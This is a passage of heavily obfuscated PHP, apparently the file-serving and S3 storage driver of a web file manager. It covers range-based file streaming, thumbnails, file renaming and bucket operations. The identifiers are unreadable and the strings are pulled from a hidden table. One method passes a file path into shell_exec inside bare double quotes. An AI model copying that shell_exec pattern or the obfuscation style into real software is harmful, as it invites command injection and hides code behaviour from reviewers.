Cache::get($º½¤¡¾[101]); if (!$é²Ö¦Å) { $´óæÊô© = BASIC_PATH . $º½¤¡¾[102]; $Ô¢ù¡È = md5_file($´óæÊô©); $é²Ö¦Å = $º½¤¡¾[103]; foreach ($ƒ®™µÖ£ as $à£¤ğÑù) { $‡ıÙ¼ùı = shell_exec($à£¤ğÑù . "\x20\42{$´óæÊô©}\x22"); if ($‡ıÙ¼ùı && substr(trim($‡ıÙ¼ùı), 0, 32) == $Ô¢ù¡È) { $é²Ö¦Å = $à£¤ğÑù; break; } } Cache::set($º½¤¡¾[101], $é²Ö¦Å, 3600); } if ($é²Ö¦Å == $º½¤¡¾[103]) { return !1; } $‡ıÙ¼ùı = shell_exec($é²Ö¦Å . "\40\x22{$îëëÎí¤}\42"); $‡ıÙ¼ùı = str_replace($º½¤¡¾[104], $º½¤¡¾[12], $‡ıÙ¼ùı); return substr($‡ıÙ¼ùı, 0, 32); } public function link($ø»®ÌÒ) { return $ø»®ÌÒ; } public function fileOut($ê¼‚ü›è, $ñ¯²ÇİÉ = false, $ª¦ø€ôò = false, $î¿èá¹ä = '') { $©Éş† =& $_SERVER[Ì¥ŞÒ°£]; $this->cacheMethod(null, null); if (!$ê¼‚ü›è || !$this->exist($ê¼‚ü›è)) { show_json(LNG($©Éş†[105]), !1, $ª¦ø€ôò); } $µ¢ë‹› = $this->getType() == $©Éş†[106]; $Âí´òÉÌ = $GLOBALS[$©Éş†[6]][$©Éş†[89]][$©Éş†[107]][$©Éş†[108]]; $„©¯—¦İ = (double) $GLOBALS[$©Éş†[6]][$©Éş†[89]][$©Éş†[107]][$©Éş†[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $«˜¢³¤Œ = $this->infoFull($ê¼‚ü›è); $½«À¨± = $«˜¢³¤Œ[$©Éş†[76]]; $şÅâş•€ = gmdate($©Éş†[110], $«˜¢³¤Œ[$©Éş†[85]]); $©íĞÂéÇ = $ª¦ø€ôò ? $ª¦ø€ôò : $this->iconvApp($«˜¢³¤Œ[$©Éş†[32]]); $ı×“çğ¶ = 0; $È‹ÑàÄ = $½«À¨± - 1; $œÛËòğÖ = $this->ext($©íĞÂéÇ); if (in_array($œÛËòğÖ, array($©Éş†[111], $©Éş†[112], $©Éş†[113], $©Éş†[114]))) { $œÛËòğÖ = $©Éş†[115]; } if (in_array($œÛËòğÖ, array($©Éş†[116]))) { $œÛËòğÖ = $©Éş†[117]; } if (!$î¿èá¹ä) { $î¿èá¹ä = md5($şÅâş•€ . $this->hashSimple($ê¼‚ü›è)); } $î¿èá¹ä = $©Éş†[118] . $î¿èá¹ä . $©Éş†[118]; $¥é÷«É© = get_file_mime($œÛËòğÖ); $©µ µ‘û = !0; $©µ µ‘û = isset($_GET[$©Éş†[119]]) ? !1 : !0; if ($ñ¯²ÇİÉ === !1 && !mime_support($¥é÷«É©)) { $¥é÷«É© = $©Éş†[120]; } header($©Éş†[121]); header($©Éş†[122] . $¥é÷«É©); $«è®À÷ = rawurlencode($©íĞÂéÇ); $«è®À÷ = $©Éş†[118] . $«è®À÷ . $©Éş†[123] . $«è®À÷; if ($ñ¯²ÇİÉ) { header($©Éş†[124]); header($©Éş†[125] . $«è®À÷); } else { if ($©µ µ‘û) { header($©Éş†[126] . $«è®À÷); } } header($©Éş†[127] . gmdate($©Éş†[110], time() + 3600 * 24 * 30) . $©Éş†[128]); header($©Éş†[129]); header($©Éş†[130]); header($©Éş†[131]); if (isset($_SERVER[$©Éş†[132]]) && strtotime($_SERVER[$©Éş†[132]]) == $«˜¢³¤Œ[$©Éş†[85]]) { header($©Éş†[133], !0, 304); die; } if (isset($_SERVER[$©Éş†[134]]) && $_SERVER[$©Éş†[134]] == $î¿èá¹ä) { header($©Éş†[135] . $î¿èá¹ä, !0, 304); die; } header($©Éş†[135] . $î¿èá¹ä); header($©Éş†[136] . $şÅâş•€ . $©Éş†[128]); header($©Éş†[137] . $©íĞÂéÇ); header($©Éş†[138]); header($©Éş†[139] . $½«À¨±); header($©Éş†[140]); if (!$ñ¯²ÇİÉ && $œÛËòğÖ == $©Éş†[141]) { if ($½«À¨± > 1024 * 1024 * 5) { die; } $Á¿±œ©Á = $this->getContent($ê¼‚ü›è); $Á¿±œ©Á = Html::clearSVG($Á¿±œ©Á); header($©Éş†[142] . strlen($Á¿±œ©Á)); echo $Á¿±œ©Á; die; } $ÌÓµÅä× = strtolower($_SERVER[$©Éş†[143]]); if ($µ¢ë‹› && $ÌÓµÅä× && $Âí´òÉÌ) { if (strstr($ÌÓµÅä×, $©Éş†[144])) { header($©Éş†[145] . $ê¼‚ü›è); } else { if (strstr($ÌÓµÅä×, $©Éş†[146])) { header($©Éş†[147] . $ê¼‚ü›è); } else { if (strstr($ÌÓµÅä×, $©Éş†[148])) { header($©Éş†[149] . $ê¼‚ü›è); } } } if ($„©¯—¦İ) { header($©Éş†[150] . $„©¯—¦İ); } return; } if (isset($_SERVER[$©Éş†[151]])) { if (preg_match($©Éş†[152], $_SERVER[$©Éş†[151]], $²¢Ñ³Ş)) { $ı×“çğ¶ = intval($²¢Ñ³Ş[1]); $ı×“çğ¶ = $ı×“çğ¶ <= 0 ? 0 : ($ı×“çğ¶ >= $È‹ÑàÄ ? $È‹ÑàÄ : $ı×“çğ¶); if (!empty($²¢Ñ³Ş[2])) { $«Ğ¡½ù‹ = intval($²¢Ñ³Ş[2]); $È‹ÑàÄ = $«Ğ¡½ù‹ < $ı×“çğ¶ ? $ı×“çğ¶ : ($«Ğ¡½ù‹ >= $È‹ÑàÄ ? $È‹ÑàÄ : $«Ğ¡½ù‹); } } header($©Éş†[153]); header("\x43\157\156\164\145\x6e\164\x2d\x52\141\x6e\x67\145\x3a\40\x62\x79\x74\145\163\x20{$ı×“çğ¶}\x2d{$È‹ÑàÄ}\57" . $½«À¨±); } else { header($©Éş†[154]); } header($©Éş†[155]); $­Ø›òŞÆ = !0; if ($_SERVER[$©Éş†[156]] == $©Éş†[157] && $½«À¨± > 1204 * 1024 * 1024 * 2) { $­Ø›òŞÆ = !1; } if ($­Ø›òŞÆ) { header($©Éş†[158] . ($È‹ÑàÄ - $ı×“çğ¶ + 1)); } if ($_SERVER[$©Éş†[159]] == $©Éş†[160]) { return; } $ì¡¤Üê’ = 1024 * 100; $çã£Ğƒ = 0; if ($„©¯—¦İ) { $çã£Ğƒ = intval(1000 * 1000 * ($ì¡¤Üê’ / $„©¯—¦İ)); } while ($ı×“çğ¶ <= $È‹ÑàÄ) { $†›‹ó¯ü = timeFloat(); check_abort(); $²ŸÉÙõ· = $È‹ÑàÄ - $ı×“çğ¶ + 1; if ($²ŸÉÙõ· <= $ì¡¤Üê’) { $ì¡¤Üê’ = $²ŸÉÙõ·; } echo $this->fileSubstr($ê¼‚ü›è, $ı×“çğ¶, $ì¡¤Üê’); $ı×“çğ¶ += $ì¡¤Üê’; if ($ì¡¤Üê’ == $²ŸÉÙõ·) { $ı×“çğ¶ = $È‹ÑàÄ + 1; } if ($çã£Ğƒ) { $˜òŠù—° = intval(1000 * 1000 * (timeFloat() - $†›‹ó¯ü)); $—øäıµæ = $çã£Ğƒ - $˜òŠù—°; if ($—øäıµæ > 5) { usleep($—øäıµæ); } } } } public function fileOutServer($Ê¯¨´Ù„, $ğÉ˜ï†Ç = false, $ğû“ÈÆØ = false, $¬±³ñ›« = '') { $this->fileOut($Ê¯¨´Ù„, $ğÉ˜ï†Ç, $ğû“ÈÆØ, $¬±³ñ›«); } public function fileOutLink($ÆÀş‡·˜) { header($_SERVER[Ì¥ŞÒ°£][161] . $ÆÀş‡·˜); die; } public function cacheMethod($Ö´áûÒÙ, $ú¡•ÑÌ , $Ê¬˜Ôüş = null) { $ä¸ãƒ =& $_SERVER[Ì¥ŞÒ°£]; static $—ÅùÛ­ = array(); $ºäŒ……„ = $ú¡•ÑÌ  ? ltrim($this->getPathOuter($ú¡•ÑÌ ), $ä¸ãƒ[8]) : $ä¸ãƒ[12]; $‘Ù¹£Ô = $ä¸ãƒ[162] . $Ö´áûÒÙ . $ä¸ãƒ[163] . rtrim($ºäŒ……„, $ä¸ãƒ[8]); if (is_null($Ö´áûÒÙ)) { $—ÅùÛ­ = array(); return; } if (is_null($ú¡•ÑÌ )) { foreach ($—ÅùÛ­ as $‘Ù¹£Ô => $·“¬–ê¾) { if (!strstr($‘Ù¹£Ô, $ä¸ãƒ[162] . $Ö´áûÒÙ . $ä¸ãƒ[164])) { continue; } unset($—ÅùÛ­[$‘Ù¹£Ô]); } return; } if (!is_null($Ê¬˜Ôüş)) { $—ÅùÛ­[$‘Ù¹£Ô] = $Ê¬˜Ôüş; return; } $ïıéäè¦ = isset($—ÅùÛ­[$‘Ù¹£Ô]) ? $—ÅùÛ­[$‘Ù¹£Ô] : null; if (!is_null($ïıéäè¦)) { return $ïıéäè¦; } $ïıéäè¦ = $this->{$Ö´áûÒÙ}($ú¡•ÑÌ ); $—ÅùÛ­[$‘Ù¹£Ô] = $ïıéäè¦; return $ïıéäè¦; } public function cacheMethodInfoSet($úÃˆŠ›É, $´ôÒœ¶õ, $ÓîÊ…ì° = false) { $õÌğêÔÄ =& $_SERVER[Ì¥ŞÒ°£]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($õÌğêÔÄ[165], $úÃˆŠ›É, $´ôÒœ¶õ); $this->cacheMethod($õÌğêÔÄ[166], $úÃˆŠ›É, $´ôÒœ¶õ ? !1 : !0); if (is_array($ÓîÊ…ì°)) { $this->cacheMethod($õÌğêÔÄ[167], $úÃˆŠ›É, $ÓîÊ…ì°); } } public function fileOutImage($ò¾°†‡¯, $’ìğ›’ = 250) { $¬õÃ˜–— =& $_SERVER[Ì¥ŞÒ°£]; set_timeout(); if (substr($ò¾°†‡¯, 0, 4) == $¬õÃ˜–—[148]) { $this->fileOutLink($ò¾°†‡¯); } $ã£İ¬Û = $this->info($ò¾°†‡¯); $öºª¶Ã¤ = $ã£İ¬Û[$¬õÃ˜–—[32]]; $²ñÓà¿Ÿ = !1; if (isset($GLOBALS[$¬õÃ˜–—[168]]) && $GLOBALS[$¬õÃ˜–—[168]][$¬õÃ˜–—[84]] == $ã£İ¬Û[$¬õÃ˜–—[84]]) { $úåşØ½ = $GLOBALS[$¬õÃ˜–—[168]][$¬õÃ˜–—[169]]; if (!$ã£İ¬Û[$¬õÃ˜–—[170]]) { $ã£İ¬Û[$¬õÃ˜–—[170]] = $GLOBALS[$¬õÃ˜–—[168]]; } if (isset($úåşØ½[$¬õÃ˜–—[171]])) { if ($úåşØ½[$¬õÃ˜–—[171]] <= $’ìğ›’ && $úåşØ½[$¬õÃ˜–—[172]] <= $’ìğ›’) { $²ñÓà¿Ÿ = !0; } } $öºª¶Ã¤ = $ã£İ¬Û[$¬õÃ˜–—[170]][$¬õÃ˜–—[32]]; } if ($ã£İ¬Û[$¬õÃ˜–—[76]] <= 1024 * 50 || $²ñÓà¿Ÿ || !function_exists($¬õÃ˜–—[173]) || $ã£İ¬Û[$¬õÃ˜–—[174]] == $¬õÃ˜–—[175]) { return $this->fileOut($ò¾°†‡¯, !1, $öºª¶Ã¤); } if (isset($ã£İ¬Û[$¬õÃ˜–—[170]][$¬õÃ˜–—[176]])) { $„Í“ÈäĞ = $ã£İ¬Û[$¬õÃ˜–—[170]][$¬õÃ˜–—[176]]; } else { if (isset($ã£İ¬Û[$¬õÃ˜–—[170]][$¬õÃ˜–—[177]])) { $„Í“ÈäĞ = $ã£İ¬Û[$¬õÃ˜–—[170]][$¬õÃ˜–—[177]]; } } if (!$„Í“ÈäĞ) { $„Í“ÈäĞ = md5("{$ã£İ¬Û[$¬õÃ˜–—[32]]}\137{$ã£İ¬Û[$¬õÃ˜–—[84]]}\137{$ã£İ¬Û[$¬õÃ˜–—[76]]}\137{$’ìğ›’}"); } $Š¤Ğ’‹¥ = "{$„Í“ÈäĞ}\137{$’ìğ›’}\56\160\x6e\147"; if (!($ÙÁùš¬™ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¬õÃ˜–—[178]))) { $ıƒÚÑ‚˜ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¬õÃ˜–—[179]); } else { $ıƒÚÑ‚˜ = KodIO::make($ÙÁùš¬™); } if ($ÙÁùš¬™ = IO::fileNameExist($ıƒÚÑ‚˜, $Š¤Ğ’‹¥)) { $ÖÂœ¡¼ = KodIO::make($ÙÁùš¬™); return IO::fileOut($ÖÂœ¡¼, !1, $öºª¶Ã¤); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ÖÂœ¡¼ = DATA_THUMB . $Š¤Ğ’‹¥; del_file($ÖÂœ¡¼); if (!@file_exists($ÖÂœ¡¼)) { $ú±Ä‹™Í = TEMP_FILES; if (!is_dir($ú±Ä‹™Í)) { mk_dir($ú±Ä‹™Í); } $²£üåõ = $ú±Ä‹™Í . $„Í“ÈäĞ . $¬õÃ˜–—[10] . $ã£İ¬Û[$¬õÃ˜–—[174]]; if (!@file_exists($²£üåõ)) { $²£üåõ = $this->download($ò¾°†‡¯, $²£üåõ); } ImageThumb::createThumb($²£üåõ, $ÖÂœ¡¼, $’ìğ›’, $’ìğ›’ * 10); } if (!file_exists($ÖÂœ¡¼) || filesize($ÖÂœ¡¼) < 100) { return @file_exists($²£üåõ) ? IO::fileOut($²£üåõ) : $this->fileOut($ò¾°†‡¯); } if (!($¦äÖ±¯ß = IO::move($ÖÂœ¡¼, $ıƒÚÑ‚˜))) { return IO::fileOut($ÖÂœ¡¼); } del_file($ÖÂœ¡¼); IO::fileOut($¦äÖ±¯ß); } public function fileOutImageServer($¯õú¯·, $õŠ©µ°ô = 250) { $this->fileOutImage($¯õú¯·, $õŠ©µ°ô); } public function fileNameAuto($š§“Ô—¯, $ôëªóÆğ, $‘ÀÄ–×· = REPEAT_RENAME, $íŸ§ÕÈç = false) { $·šÊÁˆâ =& $_SERVER[Ì¥ŞÒ°£]; $µ“õâûÔ = $š§“Ô—¯ === $·šÊÁˆâ[12] ? $ôëªóÆğ : rtrim($š§“Ô—¯, $·šÊÁˆâ[8]) . $·šÊÁˆâ[8] . $ôëªóÆğ; if ($‘ÀÄ–×· == REPEAT_REPLACE || !$this->exist($µ“õâûÔ) || $íŸ§ÕÈç && $‘ÀÄ–×· != REPEAT_RENAME_FOLDER) { return $ôëªóÆğ; } if ($‘ÀÄ–×· == REPEAT_SKIP) { return !1; } $‰¸©Üü¬ = $·šÊÁˆâ[10] . get_path_ext($ôëªóÆğ); $‰¸©Üü¬ = $‰¸©Üü¬ == $·šÊÁˆâ[10] || $íŸ§ÕÈç ? $·šÊÁˆâ[12] : $‰¸©Üü¬; $³¦Õ©¶£ = 1; $¤­¾òÒÓ = substr($ôëªóÆğ, 0, strlen($ôëªóÆğ) - strlen($‰¸©Üü¬)); $“ÔŒÄê¤ = $¤­¾òÒÓ . "\x28{$³¦Õ©¶£}\x29{$‰¸©Üü¬}"; while ($this->exist(rtrim($š§“Ô—¯, $·šÊÁˆâ[8]) . $·šÊÁˆâ[8] . $“ÔŒÄê¤)) { $“ÔŒÄê¤ = $¤­¾òÒÓ . "\50{$³¦Õ©¶£}\51{$‰¸©Üü¬}"; $³¦Õ©¶£++; } return $“ÔŒÄê¤; } private function fileNameAutoList($ïãí¸Ñş, $¤³ÅåŠÇ, $óİå˜ä = false) { $¼ìÄ¾¹ø =& $_SERVER[Ì¥ŞÒ°£]; $¯Õ¶Øıı = $this->listPath($ïãí¸Ñş, !0); $¯Õ¶Øıı = array_merge($¯Õ¶Øıı[$¼ìÄ¾¹ø[82]], $¯Õ¶Øıı[$¼ìÄ¾¹ø[83]]); $ƒ²‘ì = array_to_keyvalue($¯Õ¶Øıı, $¼ìÄ¾¹ø[12], $¼ìÄ¾¹ø[32]); $«ÃéË¹ß = $¼ìÄ¾¹ø[10] . get_path_ext($¤³ÅåŠÇ); $«ÃéË¹ß = $«ÃéË¹ß == $¼ìÄ¾¹ø[10] || $óİå˜ä ? $¼ìÄ¾¹ø[12] : $«ÃéË¹ß; $½–¥Åïä = substr($¤³ÅåŠÇ, 0, strlen($¤³ÅåŠÇ) - strlen($«ÃéË¹ß)); $ÌŒÙ¿“ = $½–¥Åïä . "\50\x30\51{$«ÃéË¹ß}"; for ($è‚€Á¯À = 1; $è‚€Á¯À <= count($ƒ²‘ì) + 1; $è‚€Á¯À++) { $ÌŒÙ¿“ = $½–¥Åïä . "\50{$è‚€Á¯À}\x29{$«ÃéË¹ß}"; if (!in_array_not_case($ÌŒÙ¿“, $ƒ²‘ì)) { return $ÌŒÙ¿“; } } return $ÌŒÙ¿“; } public function listAllFiles($ç¯æƒ×…, $¯‚ã’Æã, $øÜ¢åÏí = array()) { $Ú¥öËÏ¬ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($¯‚ã’Æã)) { return array(); } $´½Ïë¿• = array(); $ç¯æƒ×… = trim($ç¯æƒ×…, $Ú¥öËÏ¬[8]); foreach ($¯‚ã’Æã as $ÀÖ½Üíˆ) { $¢ò½°úÊ = ltrim(substr(trim($ÀÖ½Üíˆ, $Ú¥öËÏ¬[8]), strlen($ç¯æƒ×…)), $Ú¥öËÏ¬[8]); $´½Ïë¿• = array_merge($´½Ïë¿•, $this->slicePath($¢ò½°úÊ)); } $îÙË¥ß§ = array(); foreach (array_unique($´½Ïë¿•) as $ÀÖ½Üíˆ) { $ÑÅ¯¥ = array($Ú¥öËÏ¬[84] => $this->getPathOuter($Ú¥öËÏ¬[8] . $ç¯æƒ×… . $Ú¥öËÏ¬[8] . $ÀÖ½Üíˆ), $Ú¥öËÏ¬[75] => 1, $Ú¥öËÏ¬[76] => 0); if (substr($ÀÖ½Üíˆ, -1) != $Ú¥öËÏ¬[8]) { $ÑÅ¯¥[$Ú¥öËÏ¬[75]] = 0; $²ÁØªøİ = $this->getPath($ç¯æƒ×… . $Ú¥öËÏ¬[8] . $ÀÖ½Üíˆ); $ÑÅ¯¥[$Ú¥öËÏ¬[76]] = isset($øÜ¢åÏí[$²ÁØªøİ]) ? $øÜ¢åÏí[$²ÁØªøİ] : $this->size($²ÁØªøİ); } $îÙË¥ß§[] = $ÑÅ¯¥; } return $îÙË¥ß§; } public function slicePath($í†ÂĞœ£) { $÷ÔéŒ =& $_SERVER[Ì¥ŞÒ°£]; $Ò¿òÏÇ¿ = explode($÷ÔéŒ[8], trim($í†ÂĞœ£, $÷ÔéŒ[8])); $ª·¿ó™æ = 0; do { ++$ª·¿ó™æ; $ËÓ¡‚¸Ø[] = implode($÷ÔéŒ[8], array_slice($Ò¿òÏÇ¿, 0, $ª·¿ó™æ)) . $÷ÔéŒ[8]; } while ($ª·¿ó™æ < count($Ò¿òÏÇ¿)); $ËÓ¡‚¸Ø[count($Ò¿òÏÇ¿) - 1] = $í†ÂĞœ£; return $ËÓ¡‚¸Ø; } public function getHost() { $ÉØãü¦ =& $_SERVER[Ì¥ŞÒ°£]; $ÑîŞ“úÃ = parse_url(trim($this->domain, $ÉØãü¦[8])); $”È’İ®Ã = isset($ÑîŞ“úÃ[$ÉØãü¦[180]]) ? $ÑîŞ“úÃ[$ÉØãü¦[180]] : http_type(); $ÅÓœ““ñ = isset($ÑîŞ“úÃ[$ÉØãü¦[181]]) ? $ÑîŞ“úÃ[$ÉØãü¦[181]] : $ÑîŞ“úÃ[$ÉØãü¦[84]]; if (isset($ÑîŞ“úÃ[$ÉØãü¦[182]])) { $ÅÓœ““ñ .= $ÉØãü¦[4] . $ÑîŞ“úÃ[$ÉØãü¦[182]]; } return $”È’İ®Ã . $ÉØãü¦[183] . $ÅÓœ““ñ; } public function pathEncode($ µà«‡ƒ) { $®¤¹¢Ì =& $_SERVER[Ì¥ŞÒ°£]; return str_replace($®¤¹¢Ì[184], $®¤¹¢Ì[8], rawurlencode($ µà«‡ƒ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Ê×ˆ¡æ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ì¥ŞÒ°£][185]; parent::__construct(); $this->_init($Ê×ˆ¡æ); } public function _init($ô“Ò££) { foreach ($ô“Ò££ as $•ó¸¢® => $÷êŠ€…Ä) { if (isset($this->{$•ó¸¢®})) { $this->{$•ó¸¢®} = $÷êŠ€…Ä; } } $this->endpoint = $ô“Ò££[$_SERVER[Ì¥ŞÒ°£][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($˜Å¨Ÿû® = "\166\x34") { $this->signVer = $˜Å¨Ÿû®; $this->client->setSignatureVersion($˜Å¨Ÿû®); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¯ß’¡Şš =& $_SERVER[Ì¥ŞÒ°£]; $ÇÁÛˆÇ‰ = $this->getBucketCors(); if (!$ÇÁÛˆÇ‰ || !is_array($ÇÁÛˆÇ‰)) { return !1; } if ($ÇÁÛˆÇ‰[$¯ß’¡Şš[187]] != $¯ß’¡Şš[188] || $ÇÁÛˆÇ‰[$¯ß’¡Şš[189]] != $¯ß’¡Şš[188]) { return !1; } $ÖªÃ÷ß« = array_map($¯ß’¡Şš[190], $ÇÁÛˆÇ‰[$¯ß’¡Şš[191]]); if (!is_array($ÖªÃ÷ß«)) { $ÖªÃ÷ß« = array(); } $—’°à‡ = array($¯ß’¡Şš[192], $¯ß’¡Şš[193], $¯ß’¡Şš[194], $¯ß’¡Şš[195], $¯ß’¡Şš[196]); $ó×õ—çŸ = array_diff($—’°à‡, $ÖªÃ÷ß«); return empty($ó×õ—çŸ); } public function mkfile($™£’™‰˜, $ÒÄ“±ÄŸ = '', $çâúÚçÚ = REPEAT_RENAME) { $ß¬ùµÕ‹ = $this->setContent($™£’™‰˜, $ÒÄ“±ÄŸ); if ($ß¬ùµÕ‹ !== !1) { return $this->getPathOuter($™£’™‰˜); } return !1; } public function mkdir($Ì’ùÎ½É, $¤µšŞíÂ = REPEAT_SKIP) { $ìãìŸÕ´ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($Ì’ùÎ½É) && $Ì’ùÎ½É !== $ìãìŸÕ´[197]) { return !1; } if ($¤µšŞíÂ && $this->_isFolder($Ì’ùÎ½É)) { return $this->getPathOuter($Ì’ùÎ½É); } $ıÖ“ŒÑ® = $this->setContent($Ì’ùÎ½É, $ìãìŸÕ´[12], !0); if ($ıÖ“ŒÑ® !== !1) { return $this->getPathOuter($Ì’ùÎ½É); } return !1; } public function copyFile($‡³Ş Œ¡, $é­¨ù†á, $º¨¼—÷® = array()) { $¼®Â‘º =& $_SERVER[Ì¥ŞÒ°£]; $Êé¯ëìÃ = $this->objectMeta($‡³Ş Œ¡); if (!$Êé¯ëìÃ) { return !1; } if ($Êé¯ëìÃ[$¼®Â‘º[76]] <= 1024 * 1024 * 200) { $¬òŒ´µ = $this->client->copyObject($this->bucket, $‡³Ş Œ¡, $this->bucket, $é­¨ù†á, $¼®Â‘º[198], $º¨¼—÷®); } else { $¬òŒ´µ = $this->client->multiCopyObject($this->bucket, $‡³Ş Œ¡, $this->bucket, $é­¨ù†á, $º¨¼—÷®); } $¬òŒ´µ = $¬òŒ´µ ? $this->getPathOuter($é­¨ù†á) : !1; return $¬òŒ´µ; } public function moveFile($ñ÷ÌĞˆ, $„òÚ°¡ñ) { if ($this->copyFile($ñ÷ÌĞˆ, $„òÚ°¡ñ)) { $this->delFile($ñ÷ÌĞˆ); return $this->getPathOuter($„òÚ°¡ñ); } return !1; } public function delFile($æÆ¸ÌªÛ) { return $this->client->deleteObject($this->bucket, $æÆ¸ÌªÛ); } public function delFolder($øæÀ‚ùö) { $œıøÈóò =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->exist($øæÀ‚ùö)) { return !0; } $this->listItemCache = !1; $›†Èá²İ = $this->fileList($øæÀ‚ùö); $this->listItemCache = !0; $©øá»İ… = trim($øæÀ‚ùö, $œıøÈóò[8]) . $œıøÈóò[8]; if (!empty($øæÀ‚ùö) && $øæÀ‚ùö !== $œıøÈóò[197] && !in_array($©øá»İ…, $›†Èá²İ[$œıøÈóò[82]])) { $›†Èá²İ[$œıøÈóò[82]][] = $©øá»İ…; } $Üœ˜·Œ = $this->delByBatch($›†Èá²İ[$œıøÈóò[83]]); if (!$Üœ˜·Œ) { return !1; } $Üœ˜·Œ = $this->delByBatch($›†Èá²İ[$œıøÈóò[82]]); if (!$Üœ˜·Œ) { return !1; } return $this->delFile($©øá»İ…); } private function delByBatch($†™–¯™Ù) { foreach (array_chunk($†™–¯™Ù, 1000) as $Çƒş†Áù) { $›¹Ï„Ê£ = $this->client->deleteObjects($this->bucket, $Çƒş†Áù); if (!$›¹Ï„Ê£) { return !1; } } return !0; } public function rename($¥¹¤ëó¨, $Æçšç“Ü) { return $this->renameObject($¥¹¤ëó¨, $Æçšç“Ü); } public function listPath($öñ—šÙ, $Áà³Ö– = false) { $ÈáÑâûØ =& $_SERVER[Ì¥ŞÒ°£]; $ì·Ã£®ö = $this->fileList($öñ—šÙ, $ÈáÑâûØ[8], !0); foreach ($ì·Ã£®ö[$ÈáÑâûØ[82]] as $‘Şï‚ÀÏ => $Áæø¸òİ) { $ì·Ã£®ö[$ÈáÑâûØ[82]][$‘Şï‚ÀÏ] = $this->folderInfo($Áæø¸òİ, $Áà³Ö–, $Áæø¸òİ); } foreach ($ì·Ã£®ö[$ÈáÑâûØ[83]] as $‘Şï‚ÀÏ => $Áæø¸òİ) { $ì·Ã£®ö[$ÈáÑâûØ[83]][$‘Şï‚ÀÏ] = $this->fileInfo($Áæø¸òİ[$ÈáÑâûØ[32]], $Áà³Ö–, $Áæø¸òİ); } return $ì·Ã£®ö; } protected function infoChildren($æáòŒîİ, &$µŸˆà—´) { $Ü²ı—Å£ =& $_SERVER[Ì¥ŞÒ°£]; $çÆÕ¥ö‰ = $this->fileList($æáòŒîİ, $Ü²ı—Å£[12], !0); $µŸˆà—´[$Ü²ı—Å£[78]] += count($çÆÕ¥ö‰[$Ü²ı—Å£[82]]); $µŸˆà—´[$Ü²ı—Å£[77]] += count($çÆÕ¥ö‰[$Ü²ı—Å£[83]]); foreach ($çÆÕ¥ö‰[$Ü²ı—Å£[83]] as $Å¤•°šı) { if (!$Å¤•°šı || !$Å¤•°šı[$Ü²ı—Å£[76]]) { continue; } $µŸˆà—´[$Ü²ı—Å£[76]] += $Å¤•°šı[$Ü²ı—Å£[76]]; } } private function fileInfo($ª¯²£ÌÏ, $é®»ÚÕŠ = false, $»ñ¼ñ¼è = array()) { $¼ÎÈ¥°û =& $_SERVER[Ì¥ŞÒ°£]; $…‘Í Ä¤ = array($¼ÎÈ¥°û[32] => $this->pathThis($ª¯²£ÌÏ), $¼ÎÈ¥°û[84] => $this->getPathOuter($ª¯²£ÌÏ), $¼ÎÈ¥°û[33] => $¼ÎÈ¥°û[199], $¼ÎÈ¥°û[174] => $this->ext($ª¯²£ÌÏ), $¼ÎÈ¥°û[76] => isset($»ñ¼ñ¼è[$¼ÎÈ¥°û[76]]) ? $»ñ¼ñ¼è[$¼ÎÈ¥°û[76]] : 0); if ($é®»ÚÕŠ) { return $…‘Í Ä¤; } $…‘Í Ä¤[$¼ÎÈ¥°û[200]] = $…‘Í Ä¤[$¼ÎÈ¥°û[85]] = 0; $…‘Í Ä¤[$¼ÎÈ¥°û[201]] = $…‘Í Ä¤[$¼ÎÈ¥°û[202]] = !0; if (empty($»ñ¼ñ¼è)) { $»ñ¼ñ¼è = $this->objectMeta($ª¯²£ÌÏ); if (!$»ñ¼ñ¼è) { return $…‘Í Ä¤; } } if (isset($»ñ¼ñ¼è[$¼ÎÈ¥°û[203]])) { $…‘Í Ä¤[$¼ÎÈ¥°û[85]] = $»ñ¼ñ¼è[$¼ÎÈ¥°û[203]]; } if (isset($»ñ¼ñ¼è[$¼ÎÈ¥°û[76]])) { $…‘Í Ä¤[$¼ÎÈ¥°û[76]] = $»ñ¼ñ¼è[$¼ÎÈ¥°û[76]]; } return $…‘Í Ä¤; } private function folderInfo($Ø»êç’Ì, $Å½š©¥ = false, $¹ÓÑº = array()) { $—ÀäêÉæ =& $_SERVER[Ì¥ŞÒ°£]; $™½›¾ñ = array($—ÀäêÉæ[32] => $this->pathThis($Ø»êç’Ì), $—ÀäêÉæ[84] => $this->getPathOuter($—ÀäêÉæ[8] . $Ø»êç’Ì), $—ÀäêÉæ[33] => $—ÀäêÉæ[75]); if ($Å½š©¥) { return $™½›¾ñ; } $™½›¾ñ[$—ÀäêÉæ[200]] = $™½›¾ñ[$—ÀäêÉæ[85]] = 0; $™½›¾ñ[$—ÀäêÉæ[201]] = $™½›¾ñ[$—ÀäêÉæ[202]] = !0; if ($Ø»êç’Ì == $—ÀäêÉæ[12]) { return $™½›¾ñ; } if (empty($¹ÓÑº)) { $¹ÓÑº = $this->objectMeta(trim($Ø»êç’Ì, $—ÀäêÉæ[8]) . $—ÀäêÉæ[8]); } if (isset($¹ÓÑº[$—ÀäêÉæ[203]])) { $™½›¾ñ[$—ÀäêÉæ[200]] = $¹ÓÑº[$—ÀäêÉæ[203]]; } return $™½›¾ñ; } private function fileList($¶—ÄÖ„Æ, $„ÁÒÒ = '', $èúÚÏ–ˆ = 0) { $¾íŠ‚ñ¹ =& $_SERVER[Ì¥ŞÒ°£]; $µ³òËÕ³ = rtrim($¶—ÄÖ„Æ, $¾íŠ‚ñ¹[8]) . $¾íŠ‚ñ¹[8]; $Ç¾§£ã = 